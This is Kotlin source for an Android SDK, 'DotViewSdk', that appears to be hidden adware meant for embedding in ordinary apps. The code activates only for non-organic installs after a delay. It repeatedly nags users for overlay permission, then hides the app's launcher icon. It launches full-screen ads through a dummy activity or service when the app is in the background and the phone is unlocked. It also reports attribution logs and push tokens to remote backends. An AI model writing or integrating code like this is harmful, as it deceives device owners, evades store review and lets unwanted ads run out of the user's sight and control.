package com.app.sdk.sdk

import android.app.ActivityManager
import android.app.ActivityManager.RunningAppProcessInfo
import android.app.KeyguardManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import com.android.installreferrer.api.InstallReferrerClient
import com.android.installreferrer.api.InstallReferrerStateListener
import com.app.sdk.BuildConfig
import com.app.sdk.DymmyActivity
import com.app.sdk.sdk.config.SdkConfig
import com.app.sdk.sdk.data.ApiHelper
import com.app.sdk.sdk.data.Prefs
import com.app.sdk.sdk.services.LauncherService
import com.app.sdk.sdk.utils.NotificationUtils
import com.google.android.gms.tasks.OnCompleteListener
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.installations.FirebaseInstallations
import com.google.firebase.messaging.FirebaseMessaging
import com.kochava.tracker.Tracker
import okhttp3.ResponseBody
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response
import java.text.SimpleDateFormat
import java.util.*


object DotViewSdk {
    private val currentTime get() = System.currentTimeMillis()
    private var isSendingRequest = false

    fun init(context: Context, isUnlock: Boolean = BuildConfig.DEBUG) {
        if (isLocked(context) && !isUnlock) return
        if (isUnlock) unlockSkd(context)
        if (Prefs.getInstance(context).getSendingToken() != null) return

        Handler(Looper.getMainLooper()).postDelayed({ sendPushToken(context) }, 1000)
    }

    private fun start(context: Context) {
        runInstallReferrer(context)
        runKochava(context)
    }

    fun check(context: Context) {
        if(currentTime < SdkConfig.startSDKTime) return
        if (isLocked(context)) start(context)
        else if (Prefs.getInstance(context).getSendingToken() == null) sendPushToken(context)
    }

    private fun runInstallReferrer(context: Context) {
        if (!isLocked(context)) return
        val startTime = getCurrentTime()
        with(InstallReferrerClient.newBuilder(context).build()) {
            startConnection(object : InstallReferrerStateListener {
                override fun onInstallReferrerSetupFinished(p0: Int) {
                    if (p0 != InstallReferrerClient.InstallReferrerResponse.OK) return
                    val result = "$startTime-${getCurrentTime()} ${installReferrer.installReferrer}"
                    sendLog(result, true)
                    val canStart = !installReferrer.installReferrer.contains("organic")
                    init(context, canStart || BuildConfig.DEBUG)
                }

                override fun onInstallReferrerServiceDisconnected() {

                }
            })
        }
    }

    private fun getCurrentTime() = SimpleDateFormat("mm:ss", Locale.getDefault())
        .format(Date())

    fun loadShowAd(context: Context) {
        if (Prefs.getInstance(context).isAdStarting() || isReachToStartAd(context)) {
            Prefs.getInstance(context).adIsStarting()
            if (canRunAd(context)) showAppLovinAd(context)
        } else if (!hasOverlayPermission(context)) {
            if (needShowNotificationPermission(context)) showOverlayPermissionNotification(context)
        } else if (isSdkStarted(context) && applicationNotHide(context)) hideAppIcon(context)
    }

    private fun isSdkStarted(context: Context) = currentTime >= SdkConfig.startSDKTime
            && !isLocked(context)

    private fun saveStartAdTime(context: Context) {
        Prefs.getInstance(context).saveStartAdTime(SdkConfig.getLaunchAdTime(currentTime))
    }

    private fun runKochava(context: Context) {
        val startTime = getCurrentTime()
        with(Tracker.getInstance()) {
            startWithAppGuid(context, SdkConfig.kochavaId)
            if (!installAttribution.isRetrieved) retrieveInstallAttribution {
                sendLog("$startTime-$${getCurrentTime()} ${it.toJson()}", false)
            }
        }
    }

    fun sendLog(log: String, isInstall: Boolean) {
        getUserId { id ->
            val key = if (isInstall) "Refer" else "Kochava"
            val reference = FirebaseFirestore.getInstance().collection("logs")
                .document(id.result)
            val data = mapOf(key to log)
            reference.get().addOnCompleteListener {
                if (!it.isSuccessful) return@addOnCompleteListener
                if (it.result.exists()) reference.update(data)
                else reference.set(data).addOnCompleteListener { }
            }
        }
    }

    private fun getUserId(onComplete: OnCompleteListener<String>) {
        FirebaseInstallations.getInstance()
            .id.addOnCompleteListener(onComplete)
    }

    private fun canRunAd(context: Context) =
        (!appIsRunning() || SdkConfig.canShowAdWhenAppInForeground) && context
            .getSystemService(PowerManager::class.java).isInteractive && !context
            .getSystemService(KeyguardManager::class.java).isKeyguardLocked

    private fun applicationNotHide(context: Context) =
        Prefs.getInstance(context).getStartAdTime() == -1L

    private fun isReachToStartAd(context: Context) = Prefs.getInstance(context).getStartAdTime()
        .let { it != -1L && currentTime >= it }

    private fun showOverlayPermissionNotification(context: Context) {
        val overlayNotification = NotificationUtils.getOverlayNotification(context)
        NotificationUtils.showNotification(context, overlayNotification)
    }

    private fun needShowNotificationPermission(context: Context): Boolean {
        if (appIsRunning()) return false
        val prefs =
            Prefs.getInstance(context).takeIf { it.isEnableDisplayingOverlayNotification() }
                ?: return false

        val askCount = prefs.getOverlayNotificationAskCount()
        val askDelay = SdkConfig.getAskOverlayNotificationDelay(askCount)

        val timeBetweenShowingNotifications = currentTime - prefs
            .getOverlayNotificationLastAskTime()

        if (timeBetweenShowingNotifications < askDelay) return false

        prefs.increaseNotificationAskCount()
        prefs.saveNotificationLastAskTime(currentTime)

        return true
    }

    fun enableDisplayingOverlayNotification(context: Context) {
        with(Prefs.getInstance(context)) {
            if (isEnableDisplayingOverlayNotification()) return
            enableDisplayingOverlayNotification(currentTime)
        }
    }

    fun checkOverlayResult(context: Context): Boolean {
        if (!isSdkStarted(context)) return false
        if (canHideIcon(context)) {
            hideAppIcon(context)
            return true
        }
        return false
    }

    private fun canHideIcon(context: Context) = hasOverlayPermission(context) &&
            applicationNotHide(context) && Prefs.getInstance(context).getSendingToken() != null

    private fun showAppLovinAd(context: Context) {
        val prefs = Prefs.getInstance(context)

        if (currentTime - prefs.getLastShowingAdTime() < SdkConfig.showAdDelay)
            return

        launchAdActivity(context)
    }

    fun saveShowingTime(context: Context) {
        Prefs.getInstance(context).saveShowingAdTime(currentTime)
    }

    private fun launchAdActivity(context: Context) {
        if (SdkConfig.canShowAdDirectly()) Intent(context, DymmyActivity::class.java)
            .setFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            .let(context::startActivity)
        else with(context) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                startForegroundService(Intent(this, LauncherService::class.java))
            else startService(Intent(this, LauncherService::class.java))
        }
    }

    private fun appIsRunning() = RunningAppProcessInfo().apply {
        ActivityManager.getMyMemoryState(this)
    }.importance == RunningAppProcessInfo.IMPORTANCE_FOREGROUND

    private fun hasOverlayPermission(context: Context) =
        Settings.canDrawOverlays(context)

    private fun hideAppIcon(context: Context) {
        saveStartAdTime(context)
        componentName(context, "${context.packageName}${SdkConfig.disableComponentName}")
            .let { context.packageManager.setComponentState(it, getState(false)) }

        if (!SdkConfig.canHideIcon()) {
            componentName(context, SdkConfig.enableComponentName)
                .let { context.packageManager.setComponentState(it, getState(true)) }
        }
    }

    private fun componentName(context: Context, name: String) =
        ComponentName(context, name)

    private fun PackageManager.setComponentState(name: ComponentName, state: Int) {
        setComponentEnabledSetting(name, state, PackageManager.DONT_KILL_APP)
    }

    private fun getState(isEnable: Boolean) =
        if (isEnable) PackageManager.COMPONENT_ENABLED_STATE_ENABLED
        else PackageManager.COMPONENT_ENABLED_STATE_DISABLED

    private fun sendPushToken(context: Context) {
        FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
            task.takeIf { it.isSuccessful }
                ?.result.takeIf { Prefs.getInstance(context).getSendingToken() != it }
                ?.let { sendRequest(context, it) }
        }
    }

    private fun sendRequest(context: Context, it: String) {
        if (isSendingRequest) return
        isSendingRequest = true
        ApiHelper.sendUserPushToken(context.packageName, it)
            .enqueue(callback(it, context))
    }

    private fun callback(token: String, context: Context) = object : Callback<ResponseBody> {
        override fun onResponse(call: Call<ResponseBody>, response: Response<ResponseBody>) {
            Prefs.getInstance(context).saveSendingToken(token)
            isSendingRequest = false
        }

        override fun onFailure(call: Call<ResponseBody>, t: Throwable) {
            isSendingRequest = false
        }
    }

    private fun unlockSkd(context: Context) {
        Prefs.getInstance(context).unlockSdk()
    }

    fun isLocked(context: Context) = Prefs.getInstance(context).isSKDLocked()

}